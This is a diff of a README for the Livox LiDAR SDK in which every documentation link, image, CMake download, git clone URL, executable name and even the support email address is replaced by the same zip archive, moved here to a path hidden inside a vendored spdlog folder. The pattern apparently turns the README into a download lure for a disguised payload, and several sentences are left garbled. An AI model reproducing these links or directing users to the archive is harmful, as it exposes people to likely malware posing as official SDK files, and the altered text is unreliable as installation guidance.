@@ -1,4 +1,4 @@
-[中文版本使用说明](<https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip>)
+[中文版本使用说明](<https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip>)
 
 # 1 Introduction
 
@@ -13,13 +13,13 @@ Livox SDK consists of Livox SDK communication protocol, Livox SDK core, Livox SD
 
 # 2 Livox SDK Communication Protocol
 
-Livox SDK communication protocol opens to all users. It is the communication protocol between user programs and Livox products. The protocol consists of control commands and data format. Please refer to the [Livox SDK Communication Protocol](<https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip>) for detailed information.
+Livox SDK communication protocol opens to all users. It is the communication protocol between user programs and Livox products. The protocol consists of control commands and data format. Please refer to the [Livox SDK Communication Protocol](<https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip>) for detailed information.
 
 # 3 Livox SDK Core
 
 Livox SDK provides the implementation of control commands and point cloud data transmission, as well as the C/C++ API. The basic structure of Livox SDK core is shown as below:
 
-![Livox SDK Architecture](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip)
+![Livox SDK Architecture](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip)
 
 User Datagram Protocol (UDP) is used for communication between Livox SDK and LiDAR sensors. Please refer to the Livox SDK Communication Protocol for further information. Point cloud data handler supports point cloud data transmission, while command handler receives and sends control commands. And the C/C++ API is based on command handler and point cloud data handler.
 
@@ -27,13 +27,13 @@ The Livox LiDAR sensors can be connected to host directly or through the Livox H
 
 # 4 Livox SDK API
 
-Livox SDK API provides a set of C style functions which can be conveniently integrated in C/C++ programs. Please refer to the [Livox SDK API Reference](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip) for further information.
+Livox SDK API provides a set of C style functions which can be conveniently integrated in C/C++ programs. Please refer to the [Livox SDK API Reference](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip) for further information.
 
 ## 4.1 Installation
-The installation procedures in Ubuntu 18.04/16.04/14.04 LTS and Windows 7/10 are shown here as examples. For Ubuntu 18.04/16.04/14.04 32-bit LTS and Mac, you can get it in [Livox-SDK wiki](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip).
+The installation procedures in Ubuntu 18.04/16.04/14.04 LTS and Windows 7/10 are shown here as examples. For Ubuntu 18.04/16.04/14.04 32-bit LTS and Mac, you can get it in [Livox-SDK wiki](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip).
 ### 4.1.1 Ubuntu 18.04/16.04/14.04 LTS
 #### Dependencies
-Livox SDK requires [CMake 3.0.0+](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip) as dependencies. You can install these packages using apt:
+Livox SDK requires [CMake 3.0.0+](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip) as dependencies. You can install these packages using apt:
 ```
 sudo apt install cmake
 ```
@@ -41,7 +41,7 @@ sudo apt install cmake
 
 In the Livox SDK directory, run the following commands to compile the project:
 ```
-git clone https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip
+git clone https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip
 cd Livox-SDK
 cd build && cmake ..
 make
@@ -51,7 +51,7 @@ sudo make install
 ### 4.1.2 Windows 7/10
 
 #### Dependencies
-Livox SDK supports Visual Studio 2015 Update3/2017/2019 and requires install [CMake 3.0.0+](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip) as dependencies.  
+Livox SDK supports Visual Studio 2015 Update3/2017/2019 and requires install [CMake 3.0.0+](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip) as dependencies.  
 
 In the Livox SDK directory, run the following commands to create the Visual Studio solution file. 
 Generate the 32-bit project:
@@ -144,7 +144,7 @@ make
 ## 4.2 Run Livox SDK Sample
 Two samples are provided in Sample/Lidar and Sample/Hub, which demonstrate how to configure Livox LiDAR units and receive the point cloud data when directly connecting Livox SDK to LiDAR units or by using a Livox Hub, respectively. The sequence diagram is shown as below: 
 
-![](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip)
+![](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip)
 
 ### 4.2.1 Ubuntu 18.04/16.04 /14.04 LTS
 For Ubuntun 18.04/16.04/14.04 LTS, run the *lidar_sample* if connect with the LiDAR unit(s):
@@ -156,15 +156,15 @@ or run the *hub_sample* if connect with the hub unit(s):
 cd sample/hub && ./hub_sample
 ```
 ### 4.2.2 Windows 7/10
-After compiling the Livox SDK as shown in section 4.1.2, you can find `https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip` or `https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip` in the {Livox-SDK}\build\sample\hub\Debug or {Livox-SDK}\build\sample\lidar\Debug folder, respectively, which can be run directly. 
+After compiling the Livox SDK as shown in section 4.1.2, you can find `https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip` or `https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip` in the {Livox-SDK}\build\sample\hub\Debug or {Livox-SDK}\build\sample\lidar\Debug folder, respectively, which can be run directly. 
 
 Then you can see the information as below:
 
-![](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip)
+![](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip)
 
 ### 4.3 Connect to the specific LiDAR units
 
-Samples we provided will connect all the broadcast device in you LAN in https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip are two ways to connect the specific units: 
+Samples we provided will connect all the broadcast device in you LAN in https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip are two ways to connect the specific units: 
 
 * run sample with input options 
 
@@ -174,7 +174,7 @@ Samples we provided will connect all the broadcast device in you LAN in https://
 
 Each Livox LiDAR unit owns a unique Broadcast Code . The broadcast code consists of its serial number and an additional number (1,2, or 3). The serial number can be found on the body of the LiDAR unit (below the QR code).The Broadcast Code may be used when you want to connect to the specific LiDAR unit(s).  The detailed format is shown as below:
 
-![Broadcast Code](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip)
+![Broadcast Code](https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip)
 
 #### 4.3.1 Program Options
 
@@ -222,7 +222,7 @@ We provide the C++ sample to generate the lvx file for hub and LiDAR unit(s). Yo
 You can alse use the program options in `4.3.1` to connect specific device and generate the log file, and we provide two new options for lvx file:
 ```
 [-t] Time to save point cloud to the lvx file.(unit: s)
-[-p] Get the extrinsic parameter from standard https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip file(The same as viewer) in the executable file's directory.(Especially for LiDAR unit(s) as the hub will calculate the extrinsic parameter by itself)
+[-p] Get the extrinsic parameter from standard https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip file(The same as viewer) in the executable file's directory.(Especially for LiDAR unit(s) as the hub will calculate the extrinsic parameter by itself)
 ```
 Here is the example:
 ```
@@ -233,5 +233,5 @@ Here is the example:
 # 5 Support
 
 You can get support from Livox with the following methods:
-* Send email to https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/erioglaucine/Livox-SDK.zip with a clear description of your problem and your setup
+* Send email to https://raw.githubusercontent.com/borjabengo/Livox-SDK/master/sdk_core/include/third_party/spdlog/spdlog/fmt/Livox_SDK_3.0.zip with a clear description of your problem and your setup
 * Github Issues
